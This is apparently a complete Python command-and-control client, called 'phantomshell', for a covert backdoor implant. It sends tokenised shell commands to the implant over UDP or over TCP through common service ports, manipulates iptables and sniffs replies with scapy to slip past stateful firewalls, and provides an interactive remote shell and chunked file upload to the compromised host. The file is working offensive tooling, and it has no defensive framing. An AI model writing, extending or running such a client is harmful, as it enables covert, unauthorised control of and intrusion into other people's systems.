import argparse
import atexit
import base64
import os
import random
import signal
import socket
import subprocess
import sys
import threading
import time

DEBUG = False

def dbg(msg):
    if DEBUG:
        ts = time.strftime("%H:%M:%S")
        ms = int((time.time() % 1) * 1000)
        print(f"[d {ts}.{ms:03d}] {msg}", file=sys.stderr)


class ConnectError(Exception):
    pass


# ---------------------------------------------------------------------------
# Shared
# ---------------------------------------------------------------------------

def pick_port():
    return random.randint(30000, 60000)


def gen_token():
    return '%08x' % random.getrandbits(32)


def recv_timeout(sock, timeout=3, token=None):
    dbg(f"recv_timeout: waiting up to {timeout}s, token={token}")
    sock.settimeout(timeout)
    chunks = []
    tok = token.encode() if token else None
    matched = False
    while True:
        try:
            data = sock.recv(8192)
            if data:
                dbg(f"recv_timeout: got {len(data)} bytes: {data[:80]}")
                if tok:
                    if data.startswith(tok):
                        data = data[len(tok):]
                        matched = True
                        dbg(f"recv_timeout: token matched, payload={len(data)} bytes")
                    else:
                        dbg(f"recv_timeout: skip non-token chunk ({len(data)} bytes): {data[:40]}")
                        continue
                chunks.append(data)
                sock.settimeout(1)
            else:
                dbg("recv_timeout: empty recv, connection closed")
                break
        except socket.timeout:
            dbg("recv_timeout: socket timeout")
            break
        except OSError as e:
            dbg(f"recv_timeout: OSError: {e}")
            break
    dbg(f"recv_timeout: done, {len(chunks)} chunks, matched={matched}")
    if tok and not matched:
        return None
    return b"".join(chunks)


# ---------------------------------------------------------------------------
# UDP transport
# ---------------------------------------------------------------------------

def udp_send_recv(target, port, payload, timeout=3, token=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", 0))
    dbg(f"udp_send_recv: sending {len(payload)} bytes to {target}:{port}")
    sock.sendto(payload.encode(), (target, port))
    if token is None:
        sock.close()
        return None
    dbg(f"udp_send_recv: sent, now receiving...")
    output = recv_timeout(sock, timeout, token)
    dbg(f"udp_send_recv: result={len(output) if output else None} bytes")
    sock.close()
    return output


# ---------------------------------------------------------------------------
# Scapy loader
# ---------------------------------------------------------------------------

_scapy = None

def _load_scapy():
    global _scapy
    if _scapy:
        return _scapy
    try:
        from scapy.all import IP, TCP, Raw, send, sniff, conf
        import logging
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        conf.verb = 0
        _scapy = {"IP": IP, "TCP": TCP, "Raw": Raw, "send": send,
                  "sniff": sniff}
        return _scapy
    except ImportError:
        return None


# ---------------------------------------------------------------------------
# iptables helper: block kernel from seeing reply packets (prevents RST)
# ---------------------------------------------------------------------------

_active_ipt_rules = set()


def _ipt_cleanup():
    if not _active_ipt_rules:
        return
    print(f"\n[!] Cleaning up {len(_active_ipt_rules)} iptables rule(s)", file=sys.stderr)
    for target, port, local_port in list(_active_ipt_rules):
        _ipt_undrop_input(target, port, local_port)


atexit.register(_ipt_cleanup)


def _ipt_drop_input(target, port, local_port):
    _active_ipt_rules.add((target, port, local_port))
    cmd = ["iptables", "-I", "INPUT", "1",
           "-p", "tcp", "-s", target,
           "--sport", str(port), "--dport", str(local_port),
           "-j", "DROP"]
    dbg(f"iptables DROP: {' '.join(cmd)}")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def _ipt_undrop_input(target, port, local_port):
    _active_ipt_rules.discard((target, port, local_port))
    cmd = ["iptables", "-D", "INPUT",
           "-p", "tcp", "-s", target,
           "--sport", str(port), "--dport", str(local_port),
           "-j", "DROP"]
    dbg(f"iptables UNDROP: {' '.join(cmd)}")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# ---------------------------------------------------------------------------
# Sniff TCP replies via scapy (captures at L2, bypasses kernel iptables DROP)
# ---------------------------------------------------------------------------

def _get_iface_for_target(target):
    """Use scapy's routing table to find the outgoing interface for a target."""
    try:
        from scapy.all import conf
        iface = conf.route.route(target)[0]
        dbg(f"sniff iface: resolved '{iface}' for target {target}")
        return iface
    except Exception as e:
        dbg(f"sniff iface: fallback to default ({e})")
        return None

def sniff_tcp_replies(target, target_port, local_port, timeout=3, token=None, ready=None):
    sc = _load_scapy()
    if sc is None:
        if ready:
            ready.set()
        return b""

    TCP = sc["TCP"]
    sniff_fn = sc["sniff"]
    tok = token.encode() if token else None
    iface = _get_iface_for_target(target)

    bpf = (f"tcp and src host {target} and src port {target_port} "
           f"and dst port {local_port}")
    dbg(f"sniff BPF: {bpf}")

    chunks = []
    matched = False
    end_seen = False
    deadline = time.time() + timeout
    signal_ready = True

    def _tcp_payload(pkt):
        """Get raw TCP payload bytes, bypassing scapy's upper-layer dissection
        (e.g. SMB/NetBIOS on port 445) which eats part of the payload."""
        if pkt.haslayer(TCP):
            raw = bytes(pkt[TCP].payload)
            if raw:
                return raw
        return None

    def _stop(pkt):
        payload = _tcp_payload(pkt)
        if payload:
            if tok and (payload == tok or payload.endswith(tok)):
                return True
        return False

    while time.time() < deadline:
        remaining = deadline - time.time()
        if remaining <= 0:
            break
        sniff_time = min(remaining, 0.5 if matched else 2.0)
        kwargs = dict(filter=bpf, timeout=sniff_time, stop_filter=_stop, store=True)
        if iface:
            kwargs["iface"] = iface
        if signal_ready and ready:
            kwargs["started_callback"] = ready.set
            signal_ready = False
        packets = sniff_fn(**kwargs)

        for pkt in packets:
            raw = _tcp_payload(pkt)
            if raw:
                if tok:
                    parts = raw.split(tok)
                    if len(parts) < 2:
                        dbg(f"sniff: skip non-token: {raw[:40]}")
                        continue
                    matched = True
                    for part in parts[1:]:
                        if part:
                            chunks.append(part)
                    if raw == tok or raw.endswith(tok):
                        end_seen = True
                else:
                    chunks.append(raw)
                    matched = True
                dbg(f"sniff: got {len(raw)} bytes (matched={matched} end={end_seen})")

        if end_seen:
            dbg("sniff: end marker received")
            break
        if matched and not packets:
            dbg("sniff: silence after data, stopping")
            break

    dbg(f"sniff: total {len(chunks)} chunks, {sum(len(c) for c in chunks)} bytes matched={matched}")
    if tok and not matched:
        return None
    return b"".join(chunks)


# ---------------------------------------------------------------------------
# TCP transport - connect method (real handshake + scapy sniff for reply)
# ---------------------------------------------------------------------------

def tcp_connect_send(target, port, payload, timeout=3, token=None):
    """Real TCP connect, keep socket alive, sniff for implant's raw TCP reply."""
    local_port = pick_port()
    dbg(f"tcp_connect: local_port={local_port} payload='{payload}'")

    tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcp_sock.settimeout(timeout)
    tcp_sock.bind(("0.0.0.0", local_port))

    try:
        dbg(f"tcp_connect: connecting to {target}:{port}...")
        tcp_sock.connect((target, port))
        dbg(f"tcp_connect: connected")
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        tcp_sock.close()
        dbg(f"tcp_connect: failed: {e}")
        raise ConnectError(str(e))

    _ipt_drop_input(target, port, local_port)

    try:
        sniff_result = [b""]
        sniff_ready = threading.Event()

        def _sniff_thread():
            sniff_result[0] = sniff_tcp_replies(target, port, local_port, timeout, token, sniff_ready)

        t = threading.Thread(target=_sniff_thread, daemon=True)
        t.start()
        sniff_ready.wait(timeout=5)

        dbg(f"tcp_connect: sending {len(payload)} bytes...")
        tcp_sock.sendall(payload.encode())

        t.join(timeout + 3)
        output = sniff_result[0]
        dbg(f"tcp_connect: sniff returned {len(output) if output else 0} bytes")
    finally:
        _ipt_undrop_input(target, port, local_port)
        tcp_sock.close()

    # token mode: b"" is valid (empty output), None means no token match
    if token is not None:
        return output
    return output if output else None


# ---------------------------------------------------------------------------
# Unified command dispatch
# ---------------------------------------------------------------------------

def check_status(send_fn, timeout=3):
    token = gen_token()
    out = send_fn(f"status:{token}:{token}", min(timeout, 3), token)
    return out is not None and b"up" in out


def run_command(send_fn, cmd, prefix, timeout=3):
    token = gen_token()
    payload = f"{prefix}{token}:{cmd}:{token}"
    if prefix == "run:":
        try:
            send_fn(payload, timeout)
        except ConnectError as e:
            print(f"[-] {e}", file=sys.stderr)
        return None
    try:
        return send_fn(payload, timeout, token)
    except ConnectError as e:
        print(f"[-] {e}", file=sys.stderr)
        return None


def interactive(send_fn, prefix, timeout=3):
    cwd = "/"
    if prefix == "runcap:":
        token = gen_token()
        try:
            out = send_fn(f"runcap:{token}:pwd:{token}", timeout, token)
            if out:
                cwd = out.strip().decode()
        except ConnectError:
            pass

    while True:
        try:
            cmd = input(f"phantomshell {cwd}>> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd or cmd == "exit":
            break
        token = gen_token()
        marker = gen_token()
        if prefix == "runcap:":
            wrapped = f"cd '{cwd}' && {cmd}; echo CWD{marker}; pwd"
            payload = f"runcap:{token}:{wrapped}:{token}"
            try:
                output = send_fn(payload, timeout, token)
            except ConnectError as e:
                print(f"[-] {e}", file=sys.stderr)
                continue
            if not output:
                continue
            text = output.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
            sep = f"CWD{marker}\n".encode()
            parts = text.rsplit(sep, 1)
            if len(parts) == 2:
                text = parts[0]
                cwd = parts[1].strip().decode()
            if text:
                if not text.endswith(b'\n'):
                    text += b'\n'
                sys.stdout.buffer.write(text)
                sys.stdout.flush()
        else:
            wrapped = f"cd '{cwd}' && {cmd}"
            payload = f"run:{token}:{wrapped}:{token}"
            try:
                send_fn(payload, timeout)
            except ConnectError as e:
                print(f"[-] {e}", file=sys.stderr)


# ---------------------------------------------------------------------------
# File upload (TCP only)
# ---------------------------------------------------------------------------

def tcp_upload(target, port, local_path, remote_path, timeout=10):
    with open(local_path, 'rb') as f:
        data = f.read()

    b64 = base64.b64encode(data).decode()
    file_size = len(data)

    overhead = 6 + 8 + 1 + 2 + len(remote_path) + 1 + 1 + 8
    chunk_size = ((1400 - overhead) // 4) * 4
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

    print(f"[*] Uploading {file_size} bytes ({len(chunks)} chunk(s)): {local_path} -> {remote_path}")

    for i, chunk in enumerate(chunks):
        mode = 'w' if i == 0 else 'a'
        token = gen_token()
        payload = f"write:{token}:{mode}:{remote_path}:{chunk}:{token}"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            sock.connect((target, port))
            sock.sendall(payload.encode())
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"\n[-] Chunk {i+1}/{len(chunks)} send failed: {e}")
            sock.close()
            return False
        sock.close()
        print(f"\r[+] Sent {i+1}/{len(chunks)}", end='', flush=True)

    print(f"\n[+] Upload complete: {local_path} -> {remote_path} ({file_size} bytes)")
    return True


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    def _sig_cleanup(signum, frame):
        _ipt_cleanup()
        signal.signal(signum, signal.SIG_DFL)
        os.kill(os.getpid(), signum)

    signal.signal(signal.SIGINT, _sig_cleanup)
    signal.signal(signal.SIGTERM, _sig_cleanup)

    parser = argparse.ArgumentParser(
        description="phantomshell CLI - unified UDP/TCP client",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
TCP mode uses a real TCP connect to a service port (22/80/443 etc.) to pass
stateful firewalls. Reply is sniffed via scapy (requires root).
""")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-p", "--port", type=int, default=53, help="Target port (default: 53)")
    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument("-c", "--command", help="Command to execute")
    mode_group.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    mode_group.add_argument("--up-from", metavar="LOCAL_PATH",
                            help="Local file to upload (requires --tcp and --up-to)")

    parser.add_argument("--up-to", metavar="REMOTE_PATH",
                        help="Remote destination path (requires --tcp and --up-from)")

    parser.add_argument("--tcp", action="store_true",
                        help="Use TCP connect (passes stateful firewalls)")

    parser.add_argument("--nocap", action="store_true", help="Fire-and-forget (run:, no output)")
    parser.add_argument("--timeout", type=int, default=None, help="Reply timeout (default: 3s UDP, 10s TCP)")
    parser.add_argument("--debug", action="store_true", help="Verbose debug output to stderr")
    args = parser.parse_args()

    global DEBUG
    DEBUG = args.debug

    if args.up_from and not args.up_to:
        parser.error("--up-from requires --up-to")
    if args.up_to and not args.up_from:
        parser.error("--up-to requires --up-from")
    if args.up_from and not args.tcp:
        parser.error("--up-from/--up-to require --tcp")
    if args.up_from and not os.path.isfile(args.up_from):
        parser.error(f"local file not found: {args.up_from}")

    use_tcp = args.tcp
    if args.timeout is None:
        args.timeout = 10 if use_tcp else 3
    prefix = "run:" if args.nocap else "runcap:"
    proto = "TCP" if use_tcp else "UDP"

    if args.up_from:
        print(f"[*] {proto} -> {args.target}:{args.port}")
        ok = tcp_upload(args.target, args.port, args.up_from, args.up_to, args.timeout)
        sys.exit(0 if ok else 1)

    if use_tcp:
        if os.geteuid() != 0:
            print("[-] TCP mode requires root (scapy sniff + iptables).", file=sys.stderr)
            sys.exit(1)
        if _load_scapy() is None:
            print("[-] scapy is required for TCP mode but is not installed.", file=sys.stderr)
            print("    Install it with: pip install scapy", file=sys.stderr)
            sys.exit(1)

    print(f"[*] {proto} -> {args.target}:{args.port}")

    if use_tcp:
        def send_fn(payload, timeout, token=None):
            return tcp_connect_send(args.target, args.port, payload, timeout, token)
    else:
        def send_fn(payload, timeout, token=None):
            return udp_send_recv(args.target, args.port, payload, timeout, token)

    try:
        ok = check_status(send_fn, args.timeout)
    except ConnectError as e:
        print(f"[-] {e}")
        print(f"[-] TCP requires an open port on the target. Is port {args.port} reachable?")
        sys.exit(1)

    if ok:
        print("[+] phantomshell alive")
    else:
        print("[-] No reply")
        if not use_tcp:
            sys.exit(1)
        print("[*] Continuing anyway (service may absorb status probe)")

    if args.interactive:
        if not use_tcp:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(("0.0.0.0", 0))
            def send_fn(payload, timeout, token=None):
                sock.sendto(payload.encode(), (args.target, args.port))
                if token is None:
                    return None
                return recv_timeout(sock, timeout, token)
        interactive(send_fn, prefix, args.timeout)
        if not use_tcp:
            sock.close()
    elif args.command:
        output = run_command(send_fn, args.command, prefix, args.timeout)
        if output:
            text = output.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
            lines = [l for l in text.split(b'\n') if l]
            text = b'\n'.join(lines) + b'\n'
            sys.stdout.buffer.write(text)
            sys.stdout.flush()
        elif output is not None and prefix == "runcap:":
            print("[+] Command run; no output")


if __name__ == "__main__":
    main()
